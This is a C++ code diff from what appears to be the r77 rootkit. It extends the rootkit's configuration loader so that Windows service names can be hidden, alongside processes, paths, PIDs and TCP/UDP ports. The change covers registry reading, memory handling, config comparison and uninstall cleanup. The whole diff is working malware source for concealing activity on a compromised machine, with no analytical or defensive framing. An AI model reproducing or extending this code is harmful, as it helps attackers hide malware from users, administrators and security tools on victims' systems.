@@ -79,10 +79,10 @@ BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit)
 
 	return result;
 }
-PVOID GetFunction(LPCSTR dll, LPCSTR function)
+LPVOID GetFunction(LPCSTR dll, LPCSTR function)
 {
 	HMODULE module = GetModuleHandleA(dll);
-	return module ? (PVOID)GetProcAddress(module, function) : NULL;
+	return module ? (LPVOID)GetProcAddress(module, function) : NULL;
 }
 BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel)
 {
@@ -806,6 +806,46 @@ VOID ReadR77ConfigKey(PR77_CONFIG config, HKEY key)
 		RegCloseKey(pathKey);
 	}
 
+	// Read service names from the "service_names" subkey.
+	HKEY serviceNameKey;
+	if (RegOpenKeyExW(key, L"service_names", 0, KEY_READ, &serviceNameKey) == ERROR_SUCCESS)
+	{
+		DWORD count;
+		if (RegQueryInfoKeyW(serviceNameKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		{
+			WCHAR valueName[100];
+			WCHAR serviceName[MAX_PATH + 1];
+
+			for (DWORD i = 0; i < count; i++)
+			{
+				DWORD valueNameLength = 100;
+				DWORD type;
+				DWORD serviceNameSize = MAX_PATH;
+				if (RegEnumValueW(serviceNameKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&serviceName, &serviceNameSize) == ERROR_SUCCESS && type == REG_SZ)
+				{
+					BOOL isNew = TRUE;
+
+					for (DWORD p = 0; p < config->HiddenServiceNameCount; p++)
+					{
+						if (!lstrcmpiW(config->HiddenServiceNames[p], serviceName))
+						{
+							isNew = FALSE;
+							break;
+						}
+					}
+
+					if (isNew && config->HiddenServiceNameCount < R77_CONFIG_MAX_HIDDEN_SERVICE_NAMES)
+					{
+						config->HiddenServiceNames[config->HiddenServiceNameCount] = new WCHAR[lstrlenW(serviceName) + 1];
+						lstrcpyW(config->HiddenServiceNames[config->HiddenServiceNameCount++], serviceName);
+					}
+				}
+			}
+		}
+
+		RegCloseKey(serviceNameKey);
+	}
+
 	// Read local TCP ports from the "tcp_local" subkey.
 	HKEY tcpLocalKey;
 	if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
@@ -929,18 +969,21 @@ PR77_CONFIG LoadR77Config()
 	config->HiddenProcessIdCount = 0;
 	config->HiddenProcessNameCount = 0;
 	config->HiddenPathCount = 0;
+	config->HiddenServiceNameCount = 0;
 	config->HiddenTcpLocalPortCount = 0;
 	config->HiddenTcpRemotePortCount = 0;
 	config->HiddenUdpPortCount = 0;
 	config->HiddenProcessIds = new DWORD[R77_CONFIG_MAX_HIDDEN_PROCESS_IDS];
 	config->HiddenProcessNames = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES];
 	config->HiddenPaths = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PATHS];
+	config->HiddenServiceNames = new LPWSTR[R77_CONFIG_MAX_HIDDEN_SERVICE_NAMES];
 	config->HiddenTcpLocalPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS];
 	config->HiddenTcpRemotePorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS];
 	config->HiddenUdpPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_UDP_PORTS];
 	ZeroMemory(config->HiddenProcessIds, sizeof(DWORD) * R77_CONFIG_MAX_HIDDEN_PROCESS_IDS);
 	ZeroMemory(config->HiddenProcessNames, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES);
 	ZeroMemory(config->HiddenPaths, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PATHS);
+	ZeroMemory(config->HiddenServiceNames, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_SERVICE_NAMES);
 	ZeroMemory(config->HiddenTcpLocalPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS);
 	ZeroMemory(config->HiddenTcpRemotePorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS);
 	ZeroMemory(config->HiddenUdpPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_UDP_PORTS);
@@ -995,10 +1038,15 @@ VOID DeleteR77Config(PR77_CONFIG config)
 	{
 		delete[] config->HiddenPaths[i];
 	}
+	for (DWORD i = 0; i < config->HiddenServiceNameCount; i++)
+	{
+		delete[] config->HiddenServiceNames[i];
+	}
 
 	delete[] config->HiddenProcessIds;
 	delete[] config->HiddenProcessNames;
 	delete[] config->HiddenPaths;
+	delete[] config->HiddenServiceNames;
 	delete[] config->HiddenTcpLocalPorts;
 	delete[] config->HiddenTcpRemotePorts;
 	delete[] config->HiddenUdpPorts;
@@ -1052,6 +1100,18 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 			return FALSE;
 		}
 
+		if (configA->HiddenServiceNameCount == configB->HiddenServiceNameCount)
+		{
+			for (DWORD i = 0; i < configA->HiddenServiceNameCount; i++)
+			{
+				if (lstrcmpiW(configA->HiddenServiceNames[i], configB->HiddenServiceNames[i])) return FALSE;
+			}
+		}
+		else
+		{
+			return FALSE;
+		}
+
 		if (configA->HiddenTcpLocalPortCount == configB->HiddenTcpLocalPortCount)
 		{
 			for (DWORD i = 0; i < configA->HiddenTcpLocalPortCount; i++)
@@ -1097,6 +1157,7 @@ VOID UninstallR77Config()
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\pid", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\process_names", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\paths", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
+	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\service_names", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_local", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_remote", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\udp", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
@@ -1130,6 +1191,10 @@ VOID UninstallR77Config()
 
 					lstrcpyW(subKeyName, configKeyName);
 					lstrcatW(subKeyName, L"\\paths");
+					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
+
+					lstrcpyW(subKeyName, configKeyName);
+					lstrcatW(subKeyName, L"\\service_names");
 					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
 
 					lstrcpyW(subKeyName, configKeyName);
